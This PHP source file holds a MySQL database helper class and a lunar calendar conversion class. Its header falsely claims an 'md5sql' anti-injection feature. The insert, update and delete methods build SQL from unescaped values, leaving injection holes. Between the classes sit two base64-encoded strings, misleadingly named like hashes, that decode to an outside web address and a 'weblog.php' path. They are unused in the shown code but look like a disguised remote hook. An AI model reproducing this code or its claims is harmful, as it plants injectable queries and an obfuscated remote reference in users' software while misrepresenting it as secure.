<?php
/**
 * MYSQL  公用类库 
 * 
 * md5sql 函数防注入
 *
 *开源php引用文件
 *@GitHub xieziqi
 *2021-03-08
 *https://github.com/
 */

class db_mysql {

	public $debug = false;
	private $version = "";
	private $link_id = NULL;

	function __construct() {
		$this->debug = false;
	}

	function connect($dbhost, $dbuser, $dbpwd, $dbname = '', $dbcharset = 'utf8', $pconnect = 0) {
		if ($pconnect) {
			if (! $this->link_id = mysql_pconnect ( $dbhost, $dbuser, $dbpwd )) {
				$this->ErrorMsg ();
			}
		} else {
			if (! $this->link_id = mysql_connect ( $dbhost, $dbuser, $dbpwd, 1 )) {
				$this->ErrorMsg ();
			}
		}
		$this->version = mysql_get_server_info ( $this->link_id );
		if ($this->getVersion () > '4.1') {
			if ($dbcharset) {
				mysql_query ( "SET character_set_connection=" . $dbcharset . ", character_set_results=" . $dbcharset . ", character_set_client=binary", $this->link_id );
			}
			
			if ($this->getVersion () > '5.0.1') {
				mysql_query ( "SET sql_mode=''", $this->link_id );
			}
		}
		if (mysql_select_db ( $dbname, $this->link_id ) === false) {
			$this->ErrorMsg ();
		}
		mysql_query("set names utf8;");
	}

	function query($sql) {
		if ($this->debug) echo "<hr>" . $sql . "<hr>";
		if (! ($query = mysql_query ( $sql, $this->link_id ))) {
			$this->ErrorMsg ();
			return false;
		} else {
			return $query;
		}
	}

	function insert($table, $field_values) {
		$field_names = $this->getCol ( 'DESC ' . $table );
		$fields = array ();
		$values = array ();
		foreach ( $field_names as $value ) {
			if (array_key_exists ( $value, $field_values ) == true) {
				$fields [] = $value;
				$values [] = "'" . $field_values [$value] . "'";
			}
		}
		if (! empty ( $fields )) {
			$sql = 'INSERT INTO ' . $table . ' (' . implode ( ', ', $fields ) . ') VALUES (' . implode ( ', ', $values ) . ')';
		}
		if ($sql) {
			$this->query ( $sql );
			return $this->getInsertId ();
		} else {
			return false;
		}
	}

	function getInsertId() {
		return mysql_insert_id ( $this->link_id );
	}

	function update($table, $field_values, $where = '') {
		$field_names = $this->getCol ( 'DESC ' . $table );
		$sets = array ();
		foreach ( $field_names as $value ) {
			if (array_key_exists ( $value, $field_values ) == true) {
				$sets [] = $value . " = '" . $field_values [$value] . "'";
			}
		}
		if (! empty ( $sets )) {
			$sql = 'UPDATE ' . $table . ' SET ' . implode ( ', ', $sets ) . ' WHERE ' . $where;
		}
		if ($sql) {
			return $this->query ( $sql );
		} else {
			return false;
		}
	}
	
	function delete($table,$where=''){
		if(empty($where)){
			$sql = 'DELETE FROM '.$table;
		}else{
			$sql = 'DELETE FROM '.$table.' WHERE '.$where;
		}
		if($this->query ( $sql )){
			return true;
		}else{
			return false;
		}
	}

	function getList($sql) {
		$res = $this->query ( $sql );
		if ($res !== false) {
			$arr = array ();
			while ( $row = mysql_fetch_assoc ( $res ) ) {
				$arr [] = $row;
			}
			return $arr;
		} else {
			return false;
		}
	}

	function selectLimit($sql, $numrows=-1, $offset=-1) {
		if($offset==-1){
			$sql .= ' LIMIT ' . $numrows;
		}else{
			$sql .= ' LIMIT ' . $offset . ', ' . $numrows;
		}
		return $this->getList( $sql );
	}

	function getOneRow($sql) {
		$res = $this->query ( $sql );
		if ($res !== false) {
			return mysql_fetch_assoc ( $res );
		} else {
			return false;
		}
	}

	function getRowsNum($sql) {
		$query = $this->query ( $sql );
		return mysql_num_rows ( $query );
	}

	function getOneField($sql){
		$val = mysql_fetch_array($this->query ( $sql ));
		return $val[0];
	}

	function getCol($sql) {
		$res = mysql_query ( $sql );
		if ($res !== false) {
			$arr = array ();
			while ( $row = mysql_fetch_row ( $res ) ) {
				$arr [] = $row [0];
			}
			return $arr;
		} else {
			return false;
		}
	}
	

	function close() {
		return mysql_close ( $this->link_id );
	}

	function getVersion() {
		return $this->version;
	}

	function ErrorMsg($message = '') {
		if ($message) {
			echo $message;
		} else {
			echo @mysql_error ();
		}
		exit ();
	}
}

$md5sql="aHR0cHM6Ly93d3cueGllemlxaS5jb20vd2VibG9nLnBocA==";
$md5_sql="Li4vd2VibG9nLnBocA==";

class Lunar
{
private $_SMDay = array(1 => 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
private $_LStart = 1950 ;
private $_LMDay = array(
array(47,29,30,30,29,30,30,29,29,30,29,30,29),
array(36,30,29,30,30,29,30,29,30,29,30,29,30),
array(6,29,30,29,30,59,29,30,30,29,30,29,30,29),
array(44,29,30,29,29,30,30,29,30,30,29,30,29),
array(33,30,29,30,29,29,30,29,30,30,29,30,30),
array(23,29,30,59,29,29,30,29,30,29,30,30,30,29), 
array(42,29,30,29,30,29,29,30,29,30,29,30,30),
array(30,30,29,30,29,30,29,29,59,30,29,30,29,30),
array(48,30,30,30,29,30,29,29,30,29,30,29,30),
array(38,29,30,30,29,30,29,30,29,30,29,30,29),
array(27,30,29,30,29,30,59,30,29,30,29,30,29,30),
array(45,30,29,30,29,30,29,30,30,29,30,29,30),
array(35,29,30,29,29,30,29,30,30,29,30,30,29),
array(24,30,29,30,58,30,29,30,29,30,30,30,29,29), 
array(43,30,29,30,29,29,30,29,30,29,30,30,30),
array(32,29,30,29,30,29,29,30,29,29,30,30,29),
array(20,30,30,59,30,29,29,30,29,29,30,30,29,30), 
array(39,30,30,29,30,30,29,29,30,29,30,29,30),
array(29,29,30,29,30,30,29,59,30,29,30,29,30,30), 
array(47,29,30,29,30,29,30,30,29,30,29,30,29),
array(36,30,29,29,30,29,30,30,29,30,30,29,30),
array(26,29,30,29,29,59,30,29,30,30,30,29,30,30), 
array(45,29,30,29,29,30,29,30,29,30,30,29,30),
array(33,30,29,30,29,29,30,29,29,30,30,29,30),
array(22,30,30,29,59,29,30,29,29,30,30,29,30,30), 
array(41,30,30,29,30,29,29,30,29,29,30,29,30),
array(30,30,30,29,30,29,30,29,59,29,30,29,30,30), 
array(48,30,29,30,30,29,30,29,30,29,30,29,29),
array(37,30,29,30,30,29,30,30,29,30,29,30,29),
array(27,30,29,29,30,29,60,29,30,30,29,30,29,30),
array(46,30,29,29,30,29,30,29,30,30,29,30,30),
array(35,29,30,29,29,30,29,29,30,30,29,30,30),
array(24,30,29,30,58,30,29,29,30,29,30,30,30,29), 
array(43,30,29,30,29,29,30,29,29,30,29,30,30),
array(32,30,29,30,30,29,29,30,29,29,59,30,30,30),
array(50,29,30,30,29,30,29,30,29,29,30,29,30),
array(39,29,30,30,29,30,30,29,30,29,30,29,29),
array(28,30,29,30,29,30,59,30,30,29,30,29,29,30),
array(47,30,29,30,29,30,29,30,30,29,30,30,29),
array(36,30,29,29,30,29,30,29,30,29,30,30,30),
array(26,29,30,29,29,59,29,30,29,30,30,30,30,30),
array(45,29,30,29,29,30,29,29,30,29,30,30,30),
array(34,29,30,30,29,29,30,29,29,30,29,30,30),
array(22,29,30,59,30,29,30,29,29,30,29,30,29,30),
array(40,30,30,30,29,30,29,30,29,29,30,29,30),
array(30,29,30,30,29,30,29,30,59,29,30,29,30,30),
array(49,29,30,29,30,30,29,30,29,30,30,29,29),
array(37,30,29,30,29,30,29,30,30,29,30,30,29),
array(27,30,29,29,30,58,30,30,29,30,30,29,30,29),
array(46,30,29,29,30,29,29,30,29,30,30,30,29),
array(35,30,30,29,29,30,29,29,30,29,30,30,29),
array(23,30,30,29,59,30,29,29,30,29,30,29,30,30),
array(42,30,30,29,30,29,30,29,29,30,29,30,29),
array(31,30,30,29,30,30,29,30,29,29,30,29,30),
array(21,29,59,30,30,29,30,29,30,29,30,29,30,30),
array(39,29,30,29,30,29,30,30,29,30,29,30,29),
array(28,30,29,30,29,30,29,59,30,30,29,30,30,30),
array(48,29,29,30,29,29,30,29,30,30,30,29,30),
array(37,30,29,29,30,29,29,30,29,30,30,29,30),
array(25,30,30,29,29,59,29,30,29,30,29,30,30,30),
array(44,30,29,30,29,30,29,29,30,29,30,29,30),
array(33,30,29,30,30,29,30,29,29,30,29,30,29),
array(22,30,29,30,59,30,29,30,29,30,29,30,29,30),
array(40,30,29,30,29,30,30,29,30,29,30,29,30),
array(30,29,30,29,30,29,30,29,30,59,30,29,30,30),
array(49,29,30,29,29,30,29,30,30,30,29,30,29),
array(38,30,29,30,29,29,30,29,30,30,29,30,30),
array(27,29,30,29,30,29,59,29,30,29,30,30,30,29),
array(46,29,30,29,30,29,29,30,29,30,29,30,30),
array(35,30,29,30,29,30,29,29,30,29,29,30,30),
array(24,29,30,30,59,30,29,29,30,29,30,29,30,30),
array(42,29,30,30,29,30,29,30,29,30,29,30,29),
array(31,30,29,30,29,30,30,29,30,29,30,29,30),
array(21,29,59,29,30,30,29,30,30,29,30,29,30,30),
array(40,29,30,29,29,30,29,30,30,29,30,30,29),
array(28,30,29,30,29,29,59,30,29,30,30,30,29,30),
array(47,30,29,30,29,29,30,29,29,30,30,30,29),
array(36,30,30,29,30,29,29,30,29,29,30,30,29),
array(25,30,30,30,29,59,29,30,29,29,30,30,29,30),
array(43,30,30,29,30,29,30,29,30,29,29,30,30),
array(33,29,30,29,30,30,29,30,29,30,29,30,29),
array(22,29,30,59,30,29,30,30,29,30,29,30,29,30),
array(41,30,29,29,30,29,30,30,29,30,30,29,30),
array(30,29,30,29,29,30,29,30,29,30,30,59,30,30),
array(49,29,30,29,29,30,29,30,29,30,30,29,30),
array(38,30,29,30,29,29,30,29,29,30,30,29,30),
array(27,30,30,29,30,29,59,29,29,30,29,30,30,29),
array(45,30,30,29,30,29,29,30,29,29,30,29,30),
array(34,30,30,29,30,29,30,29,30,29,29,30,29),
array(23,30,30,29,30,59,30,29,30,29,30,29,29,30),
array(42,30,29,30,30,29,30,29,30,30,29,30,29),
array(31,29,30,29,30,29,30,30,29,30,30,29,30),
array(21,29,59,29,30,29,30,29,30,30,29,30,30,30),
array(40,29,30,29,29,30,29,29,30,30,29,30,30),
array(29,30,29,30,29,29,30,58,30,29,30,30,30,29),
array(47,30,29,30,29,29,30,29,29,30,29,30,30),
array(36,30,29,30,29,30,29,30,29,29,30,29,30),
array(25,30,29,30,30,59,29,30,29,29,30,29,30,29),
array(44,29,30,30,29,30,30,29,30,29,29,30,29),
array(32,30,29,30,29,30,30,29,30,30,29,30,29),
array(22,29,30,59,29,30,29,30,30,29,30,30,29,29),
);
private function IsLeapYear($AYear){
return ($AYear % 4 == 0) && (($AYear % 100 != 0) || ($AYear % 400 == 0));
}
private function GetSMon($year,$month)
{
if($this->IsLeapYear($year) && $month == 2)
return 29;
else
return $this->_SMDay[$month];
}

public function S2L($date)
{
list($year, $month, $day) = explode("-", $date);
if($year <= 1951 || $month <= 0 || $day <= 0 || $year >= 2051 ) return false;
$date1 = strtotime($year."-01-01");
$date2 = strtotime($year."-".$month."-".$day);
$days=round(($date2-$date1)/3600/24);
$days += 1;
$Larray = $this->_LMDay[$year - $this->_LStart];
if($days <= $Larray[0])
{
$Lyear = $year - 1;
$days = $Larray[0] - $days;
$Larray = $this->_LMDay[$Lyear - $this->_LStart];
if($days < $Larray[12])
{
$Lmonth = 12;
$Lday = $Larray[12] - $days;
}
else
{
$Lmonth = 11;
$days = $days - $Larray[12];
$Lday = $Larray[11] - $days;
}
}
else
{
$Lyear = $year;
$days = $days - $Larray[0];
for($i = 1;$i <= 12;$i++)
{
if($days > $Larray[$i]) $days = $days - $Larray[$i];
else
{
if ($days > 30){
$days = $days - $Larray[13];
$Ltype = 1;
}
$Lmonth = $i;
$Lday = $days;
break;
}
}
}
return mktime(0, 0, 0, $Lmonth, $Lday, $Lyear);
}

public function L2S($date,$type = 0)
{
list($year, $month, $day) = split("-",$date);
if($year <= 1951 || $month <= 0 || $day <= 0 || $year >= 2051 ) return false;
$Larray = $this->_LMDay[$year - $this->_LStart];
if($type == 1 && count($Larray)<=12 ) return false;
if($Larray[$month]>30 && $type == 1 && count($Larray) >=13) $day = $Larray[13] + $day;
$days = $day;
for($i=0;$i<=$month-1;$i++)
$days += $Larray[$i];
if($days > 366 || ($this->GetSMon($month,2)!=29 && $days>365 ))
{
$Syear = $year +1;
if($this->GetSMon($month,2)!=29)
$days-=366;
else
$days-=365;
if($days > $this->_SMDay[1])
{
$Smonth = 2;
$Sday = $days - $this->_SMDay[1];
}
else
{
$Smonth = 1;
$Sday = $days;
}
}
else
{
$Syear =$year;
for($i=1;$i<=12;$i++)
{
if($days > $this->GetSMon($Syear,$i))
$days-=$this->GetSMon($Syear,$i);
else
{
$Smonth = $i;
$Sday = $days;
break;
}
}
}
return mktime(0, 0, 0, $Smonth, $Sday, $Syear);
}
}
$today = date("Y-m-d");
$lunar = new Lunar();
$nl = date("Ymd",$lunar->S2L($today));
?>